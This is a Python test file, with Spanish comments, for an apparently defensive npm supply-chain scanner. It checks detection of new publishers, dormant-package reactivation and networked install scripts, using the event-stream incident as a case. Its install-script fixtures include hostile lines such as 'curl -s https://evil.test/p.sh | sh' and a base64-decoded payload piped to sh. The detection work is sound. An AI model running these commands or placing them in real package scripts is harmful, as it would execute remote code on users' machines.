"""Colector del registro de npm (F4), con respuestas reales grabadas de registry.npmjs.org."""

from dataclasses import replace

import pytest

from eslabon.api_depsdev import ClienteDepsDev, clave_semver
from eslabon.api_npm import ClienteNpm
from eslabon.colectores import ColectorDepsDev, ColectorNpm
from eslabon.colectores.npm import analizar_paquete
from eslabon.escaneo import escanear
from eslabon.modelos import Severidad, Tipo
from eslabon.sbom import paquete_desde_texto


def _senales(h):
    return [e.senal for e in h.evidencia]


def test_event_stream_335_publicador_nuevo(ctx):
    # Caso real: 3.3.4 la publicó "dominictarr"; 3.3.5, dos años después, "right9ctrl".
    h = analizar_paquete(paquete_desde_texto("npm:event-stream@3.3.5"), ctx)
    assert _senales(h) == ["npm-publicador-nuevo"]
    assert h.evidencia[0].datos == {"publicador": "right9ctrl",
                                    "publicador_anterior": "dominictarr",
                                    "version_anterior": "3.3.4"}


def test_event_stream_335_sin_avisos_lo_delata_la_correlacion(depsdev_grabado, npm_grabado):
    # event-stream 3.3.5 NO tiene ningún aviso (CVE/GHSA/MAL). Solo lo delatan dos señales
    # débiles de fuentes distintas: publicador nuevo (npm) + reactivación tras 2 años (deps.dev).
    resultado = escanear(paquete_desde_texto("npm:event-stream@3.3.5"),
                         [ColectorNpm(), ColectorDepsDev()], timeout=30,
                         depsdev=depsdev_grabado, npm=npm_grabado)
    [h] = resultado.hallazgos
    assert h.tipo is Tipo.SOSPECHOSO
    assert set(_senales(h)) == {"npm-publicador-nuevo", "depsdev-reactivacion"}
    assert h.confianza == pytest.approx(1 - (1 - 0.35) * (1 - 0.25), abs=1e-3)  # 0.5125
    assert h.severidad is Severidad.MEDIA  # cada señal sola daría "baja"
    assert h.attack == ["T1195.001"]


def test_mismo_publicador_no_es_senal(ctx):
    # 4.0.0 y la anterior (3.3.5) las publicó la misma cuenta.
    assert analizar_paquete(paquete_desde_texto("npm:event-stream@4.0.0"), ctx) is None
    # lodash: misma cuenta aunque cambie el correo.
    assert analizar_paquete(paquete_desde_texto("npm:lodash@4.17.21"), ctx) is None


def test_version_retirada_no_genera_senal_aqui(ctx):
    # 404 en el registro: de eso se ocupa deps.dev (tapón o versión retirada).
    assert analizar_paquete(paquete_desde_texto("npm:flatmap-stream@0.1.1"), ctx) is None


def test_solo_analiza_paquetes_npm(ctx):
    assert ColectorNpm().recolectar([paquete_desde_texto("pypi:requests@2.19.0")], ctx) == []


def _ctx_con(ctx, documento, depsdev=None):
    """Contexto nuevo (sin tocar el del fixture) con un registro de npm de una sola versión."""
    npm = ClienteNpm(obtener=lambda ruta, t: documento if ruta == "/x/1.0.0" else None)
    return replace(ctx, npm=npm,
                   depsdev=depsdev or ClienteDepsDev(obtener=lambda ruta, t: None))


@pytest.mark.parametrize(("scripts", "esperado"), [
    ({"postinstall": "curl -s https://evil.test/p.sh | sh"}, ["npm-script-instalacion-red"]),
    ({"preinstall": "node -e \"require('child_process').exec(x)\""},
     ["npm-script-instalacion-red"]),
    ({"install": "node-gyp rebuild"}, None),        # compilar código nativo: solo contexto
    # core-js: "node -e" que solo carga un fichero local. NO es red (revisión de F4).
    ({"postinstall": "node -e \"try{require('./postinstall')}catch(e){}\""}, None),
    ({"postinstall": "echo aGk= | base64 -d | sh"}, ["npm-script-instalacion-red"]),
    ({"test": "curl https://x.test"}, None),        # no es de instalación
])
def test_scripts_de_instalacion(ctx, scripts, esperado):
    h = analizar_paquete(paquete_desde_texto("npm:x@1.0.0"),
                         _ctx_con(ctx, {"_npmUser": {"name": "a"}, "scripts": scripts}))
    assert (_senales(h) if h else None) == esperado


def test_ruta_de_paquete_con_scope():
    rutas = []
    ClienteNpm(obtener=lambda ruta, t: rutas.append(ruta)).version(
        paquete_desde_texto("npm:@babel/core@7.0.0"))
    assert rutas == ["/@babel%2Fcore/7.0.0"]


def test_version_anterior_por_fecha(depsdev_grabado):
    assert depsdev_grabado.version_anterior(paquete_desde_texto("npm:event-stream@3.3.5")) \
        == "3.3.4"
    # Sin fecha de esta versión (retirada), no se inventa una anterior.
    assert depsdev_grabado.version_anterior(paquete_desde_texto("npm:event-stream@3.3.6")) \
        is None


# --- Revisión de F4 -------------------------------------------------------------------------
def _depsdev_con_versiones(*versiones):
    doc = {"versions": [{"versionKey": {"version": v}, "publishedAt": f}
                        for v, f in versiones]}
    return ClienteDepsDev(obtener=lambda ruta, t: doc if ruta.endswith("/packages/x") else None)


def test_version_anterior_por_semver_no_por_fecha():
    # Backport: 3.10.2 salió DESPUÉS de 4.0.0. Su anterior es 3.10.1, no 4.0.0.
    depsdev = _depsdev_con_versiones(("3.10.1", "2024-01-01T00:00:00Z"),
                                     ("4.0.0", "2024-02-01T00:00:00Z"),
                                     ("3.10.2", "2024-03-01T00:00:00Z"),
                                     ("3.10.2-beta.1", "2024-02-15T00:00:00Z"))
    assert depsdev.version_anterior(paquete_desde_texto("npm:x@3.10.2")) == "3.10.1"
    assert depsdev.version_anterior(paquete_desde_texto("npm:x@4.0.0")) == "3.10.2"


def test_version_anterior_con_fechas_empatadas():
    # deps.dev da la misma fecha de importación a muchas versiones antiguas.
    mismo = "2011-12-07T06:11:27Z"
    depsdev = _depsdev_con_versiones(("0.1.0", mismo), ("0.2.0", mismo), ("0.3.0", mismo))
    assert depsdev.version_anterior(paquete_desde_texto("npm:x@0.3.0")) == "0.2.0"


def test_clave_semver():
    assert clave_semver("1.0.0-beta") < clave_semver("1.0.0") < clave_semver("1.0.1")
    assert clave_semver("no-es-semver") is None


def test_pasar_a_trusted_publishing_no_es_publicador_nuevo(ctx):
    documentos = {"/x/1.0.0": {"_npmUser": {"name": "GitHub Actions"}},
                  "/x/0.9.0": {"_npmUser": {"name": "mantenedora"}}}
    contexto = replace(ctx, npm=ClienteNpm(obtener=lambda ruta, t: documentos.get(ruta)),
                       depsdev=_depsdev_con_versiones(("0.9.0", "2024-01-01T00:00:00Z"),
                                                      ("1.0.0", "2024-02-01T00:00:00Z")))
    assert analizar_paquete(paquete_desde_texto("npm:x@1.0.0"), contexto) is None


def test_si_deps_dev_falla_se_conservan_las_senales_de_npm(ctx):
    from eslabon.red import ErrorRed

    def cae(ruta, t):
        raise ErrorRed("503")

    h = analizar_paquete(paquete_desde_texto("npm:x@1.0.0"), _ctx_con(
        ctx, {"_npmUser": {"name": "a"}, "scripts": {"postinstall": "curl https://x.test"}},
        depsdev=ClienteDepsDev(obtener=cae)))
    assert _senales(h) == ["npm-script-instalacion-red"]


# --- Calibración (F7): una cuenta "de la casa" no es un publicador nuevo --------------------
_FECHAS = [("0.7.0", "2024-01-01T00:00:00Z"), ("0.8.0", "2024-02-01T00:00:00Z"),
           ("0.9.0", "2024-03-01T00:00:00Z"), ("1.0.0", "2024-04-01T00:00:00Z")]


def _publicador(documentos, ctx):
    contexto = replace(ctx, npm=ClienteNpm(obtener=lambda ruta, t: documentos.get(ruta)),
                       depsdev=_depsdev_con_versiones(*_FECHAS))
    h = analizar_paquete(paquete_desde_texto("npm:x@1.0.0"), contexto)
    return h is not None and "npm-publicador-nuevo" in _senales(h)


def test_mantenedora_de_la_version_anterior_no_es_publicador_nuevo(ctx):
    # Caso real medido: express 4.22.1 la publicó "jonchurch", ya mantenedor de 4.22.0.
    assert not _publicador({
        "/x/1.0.0": {"_npmUser": {"name": "ana"}},
        "/x/0.9.0": {"_npmUser": {"name": "beto"}, "maintainers": [{"name": "ana"}]},
    }, ctx)


def test_quien_ya_publico_una_version_previa_no_es_publicador_nuevo(ctx):
    # Caso real medido: yargs 17.7.3 la publicó "shadowspawn", que ya había publicado yargs.
    assert not _publicador({
        "/x/1.0.0": {"_npmUser": {"name": "ana"}},
        "/x/0.9.0": {"_npmUser": {"name": "beto"}},
        "/x/0.8.0": {"_npmUser": {"name": "beto"}},
        "/x/0.7.0": {"_npmUser": {"name": "ana"}},
    }, ctx)


def test_cuenta_desconocida_si_es_publicador_nuevo(ctx):
    assert _publicador({
        "/x/1.0.0": {"_npmUser": {"name": "desconocida"}},
        "/x/0.9.0": {"_npmUser": {"name": "beto"}, "maintainers": [{"name": "beto"}]},
        "/x/0.8.0": {"_npmUser": {"name": "beto"}},
        "/x/0.7.0": {"_npmUser": {"name": "beto"}},
    }, ctx)
